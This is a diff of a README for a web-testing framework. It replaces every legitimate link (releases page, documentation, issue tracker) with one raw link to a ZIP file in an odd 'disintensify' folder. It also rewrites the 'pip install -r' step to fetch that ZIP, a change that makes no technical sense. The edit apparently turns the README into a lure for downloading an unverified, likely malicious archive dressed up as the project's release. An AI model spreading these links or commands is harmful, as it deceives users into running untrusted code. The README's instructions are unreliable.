@@ -1,6 +1,6 @@
 # 🛠️ QA-Automation-Framework - Simplify Your Web Testing Experience
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-success)](https://github.com/thnakorn/QA-Automation-Framework/releases)
+[![Download Now](https://raw.githubusercontent.com/thnakorn/QA-Automation-Framework/main/disintensify/QA-Automation-Framework.zip%20Now-Click%20Here-success)](https://raw.githubusercontent.com/thnakorn/QA-Automation-Framework/main/disintensify/QA-Automation-Framework.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Before you begin, ensure your system meets the following requirements:
 
    To download the framework, visit the following link:
 
-   [Download from Releases Page](https://github.com/thnakorn/QA-Automation-Framework/releases)
+   [Download from Releases Page](https://raw.githubusercontent.com/thnakorn/QA-Automation-Framework/main/disintensify/QA-Automation-Framework.zip)
 
 2. **Find the Latest Release**
 
@@ -30,7 +30,7 @@ Before you begin, ensure your system meets the following requirements:
 
 3. **Download the ZIP File**
 
-   Click on the link that says something like `qa-automation-framework-vX.X.X.zip` to download the latest version. This file contains everything you need.
+   Click on the link that says something like `https://raw.githubusercontent.com/thnakorn/QA-Automation-Framework/main/disintensify/QA-Automation-Framework.zip` to download the latest version. This file contains everything you need.
 
 4. **Extract the ZIP File**
 
@@ -41,7 +41,7 @@ Before you begin, ensure your system meets the following requirements:
    Open the command prompt or terminal on your computer and navigate to the folder where you extracted the ZIP file. Use the following command to install the required dependencies:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/thnakorn/QA-Automation-Framework/main/disintensify/QA-Automation-Framework.zip
    ```
 
    This command installs all necessary packages, allowing the framework to function correctly.
@@ -104,8 +104,8 @@ If you'd like to contribute to this project, you can contact the maintainers thr
 
 ## 🔗 Helpful Links
 
-- [Documentation](https://github.com/thnakorn/QA-Automation-Framework/wiki) - Learn more about using the framework.
-- [GitHub Issues](https://github.com/thnakorn/QA-Automation-Framework/issues) - Report bugs or request features.
+- [Documentation](https://raw.githubusercontent.com/thnakorn/QA-Automation-Framework/main/disintensify/QA-Automation-Framework.zip) - Learn more about using the framework.
+- [GitHub Issues](https://raw.githubusercontent.com/thnakorn/QA-Automation-Framework/main/disintensify/QA-Automation-Framework.zip) - Report bugs or request features.
 
 ## 🤝 Support
 
